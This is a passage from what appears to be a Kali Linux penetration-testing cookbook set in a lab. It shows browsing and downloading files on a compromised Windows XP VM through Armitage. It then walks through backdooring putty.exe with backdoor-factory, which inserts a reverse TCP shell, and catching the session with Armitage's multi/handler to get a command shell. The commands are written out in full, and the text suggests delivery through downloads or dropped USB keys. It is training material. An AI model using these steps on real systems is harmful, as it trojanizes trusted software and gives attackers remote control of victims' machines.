+<div class="CDPAlignCenter CDPAlign"><img height="260" width="416" class="alignnone size-full wp-image-963 image-border" src="assets/998c59d7-bbbd-4270-8b9d-509ec7d9eb62.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage VNC bind information box</div>
+<ol start="4">
+<li>Let's now click on our terminal icon from the left. <img src="assets/02f2e238-5a98-477c-a161-00d1d2cfb6c2.png"/></li>
+<li>Enter the following command from the shell:</li>
+</ol>
+<pre style="padding-left: 60px"><strong>vncviewer 127.0.0.1::5913</strong></pre>
+<ol start="6">
+<li>You will now be brought to the Windows XP machine:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="473" width="599" class="alignnone size-full wp-image-964 image-border" src="assets/a568e575-8b48-4637-821c-7b1e991f548d.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">VNC view of Windows XP VM</div>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Browsing the target's files</h1>
+                </header>
+            
+            <article>
+                
+<p>We will now browse the file system of the Windows machine:</p>
+<ol>
+<li>Right-click on the Windows XP VM, and select <span class="packt_screen">Meterpreter 3</span> | <span class="packt_screen">Explore</span><strong> </strong>| <span class="packt_screen">Browse</span> <span class="packt_screen">Files</span>. You will be presented with a familiar file browsing interface:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="362" width="1024" class="alignnone size-full wp-image-965 image-border" src="assets/5f31f37e-e22d-42e8-9bfb-745f0985555f.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage browse files screen</div>
+<ol start="2">
+<li>You will see that you can browse and change directories. You can create directories and upload files; and if you right-click on a file, you will have other options such as view and download. Download a couple of files, and then go to <span class="packt_screen">View</span> | <span class="packt_screen">Downloads</span> to see them:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="359" width="1024" class="alignnone size-full wp-image-966 image-border" src="assets/2b6bc200-37a1-4449-b663-432eb5611742.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage downloaded files screen</div>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">There's more...</h1>
+                </header>
+            
+            <article>
+                
+<p>We will be covering topics such as cracking the user password in <a href="868da5dc-85d4-4ac2-9325-1274b75c8c7d.xhtml" target="_blank">Chapter 6</a>, <em>Password Cracking</em> and persistence in <a href="02e6452a-b223-4edb-954a-fef51f21215e.xhtml" target="_blank">Chapter 10</a>, <em>Maintaining Access</em>. You may want to go do those recipes now, as they are a continuation of where we are now.</p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Using the backdoor factory and Armitage</h1>
+                </header>
+            
+            <article>
+                
+<p>We will use the backdoor factory and Armitage in combination to compromise a target system. The backdoor factory is a tool that can insert exploit code to a Windows executable file. This is great when you are trying to exploit a user through them downloading software, or even through physical attacks such as dropping USB keys.</p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Getting ready</h1>
+                </header>
+            
+            <article>
+                
+<p>Let's ensure the following prerequisites:</p>
+<ul>
+<li>Kali Linux is running, and you are logged in as root</li>
+<li>Armitage is running</li>
+<li>Your Windows XP VM is running</li>
+</ul>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">How to do it...</h1>
+                </header>
+            
+            <article>
+                
+<p>We will now use Backdoor Factory to insert exploit code into an executable:</p>
+<ol>
+<li>First, let's browse and find a popular software package that a user might want to download or may seem benign or enticing. In our case, let's go out and grab putty. Every network admin has probably used putty at some point in the past. Open Firefox <img src="assets/6f82804b-8a95-416b-b669-6e8ff80e87d5.png"/> and browse to <a href="http://www.putty.org/">www.putty.org</a>. From this site, download <kbd>putty.exe</kbd> (32 bit version); and save the file in your <kbd>Downloads</kbd> directory.</li>
+</ol>
+<div class="packt_tip">You will have to scroll down a bit on the page to find the EXE file - do not use the MSI file for this exercise.</div>
+<ol start="2">
+<li>Open terminal <img src="assets/676c69cd-bdae-4e05-b279-ba736000eec3.png"/> and enter the following. We will first make an exploit directory, and then copy the <kbd>putty.exe</kbd> file to that directory:</li>
+</ol>
+<pre style="padding-left: 60px"><strong>cd</strong><br/><strong>mkdir exploit</strong><br/><strong>cp ~/Downloads/putty.exe ~/exploit/</strong></pre>
+<ol start="3">
+<li>Next, let's take an initial run of backdoor factory and see what we have available to insert into <kbd>putty.exe</kbd>:</li>
+</ol>
+<pre style="padding-left: 60px" class="mce-root"><strong>backdoor-factory -f ~/exploit/putty.exe &lt;enter&gt;</strong></pre>
+<div class="CDPAlignCenter CDPAlign"><img height="406" width="450" class="alignnone size-full wp-image-967 image-border" src="assets/4837a190-8cee-4bf7-9129-af6b869d506f.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Backdoor factory output screen for available shell code</div>
+<ol start="4">
+<li class="mce-root">Note the options that are available to use with this executable file. We will go ahead and select <kbd>reverse_shell_tcp_inline</kbd>, use the IP of our Kali machine, and use a port number by entering the following command. During the execution of the command, you will be asked a question about where you can inject the code; let's simply select <kbd>1</kbd>:</li>
+</ol>
+<pre style="padding-left: 60px"><strong>backdoor-factory -X -f ~/exploit/putty.exe -s reverse_shell_tcp_inline -H 192.168.56.10 -P 8123</strong></pre>
+<div class="CDPAlignCenter CDPAlign"><img height="383" width="472" class="alignnone size-full wp-image-968 image-border" src="assets/86baa271-16cd-42ec-bf4e-56bf2bd12265.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Backdoor factory successfully adding shell code to putty.exe file</div>
+<div class="packt_tip">Note that we used a <kbd>-X</kbd> for a command-line option for backdoor factory. The <kbd>-X</kbd> option indicates that this file should be allowed to run on Windows XP. Also don't give up if the first time you try building the exploit it fails. If you have problems try other options and vectors. As software is updated often your results may not work exactly as mine did. This is expected.</div>
+<ol start="5">
+<li>Now, we will see a new <kbd>backdoored</kbd> directory in our <kbd>Home</kbd> directory that has <kbd>putty.exe</kbd> with the exploit in it. Move that file to your Windows XP machine, but don't run it yet.</li>
+<li>Start Armitage and go to the main screen. From the dropdown directory on the left, select <span class="packt_screen">exploit</span> | <span class="packt_screen">multi</span> | <span class="packt_screen">handler</span>, and click on it:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="309" width="169" class="alignnone size-full wp-image-969 image-border" src="assets/4a51b563-07a6-491d-9409-7318e7a4e753.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage handler menu</div>
+<ol start="7">
+<li>You will be brought to a dialog screen, so select the proper IP and port number that corresponds to what we enter for the information before. In our case, it is the Kali machine with an IP of <kbd>192.168.56.10</kbd>; and we used a port of <kbd>8123</kbd>. Click on <span class="packt_screen">Launch</span>:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="305" width="440" class="alignnone size-full wp-image-970 image-border" src="assets/de1c3924-b8a2-4a2d-9bc0-6e03b0925c0e.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage launch dialog screen</div>
+<ol start="8">
+<li>You will see the handler launch; note at the top that your Windows XP machine appears normal:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="495" width="658" class="alignnone size-full wp-image-971 image-border" src="assets/faf7c8ee-61f5-41a1-a6ab-17cb17cc5ffb.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage output screen</div>
+<ol start="9">
+<li>Now, launch <kbd>putty.exe</kbd> on your Windows VM:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="479" width="640" class="alignnone size-full wp-image-972 image-border" src="assets/3eceb676-0ed3-40bb-a86a-5a665f6dc56a.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Windows XP running exploited putty.exe file</div>
+<ol start="10">
+<li>Note that your Windows XP Machine icon will now change to show that it has been exploited; and you will also see that the session has opened from the console output:</li>
+</ol>
+<div class="packt_figref CDPAlignCenter CDPAlign"><img height="496" width="660" class="alignnone size-full wp-image-973 image-border" src="assets/52f01d24-1dcf-4c83-9133-84e0b95c5917.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage screen showing successful connection and exploited device icon</div>
+<ol start="11">
+<li>If you right-click on the Windows XP machine, you can select <span class="packt_screen">Shell 1</span> | <span class="packt_screen">Interact</span>. You will then be dropped into a shell screen to do as you wish:</li>
+</ol>
+<div class="packt_figref"><img height="767" width="1024" class="alignnone size-full wp-image-974 image-border" src="assets/930e4524-6007-4a05-a746-d4d3ec723dda.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage showing command shell screen</div>
+
+
+            </article>
+
+            
+        </section>
+    </body></html>
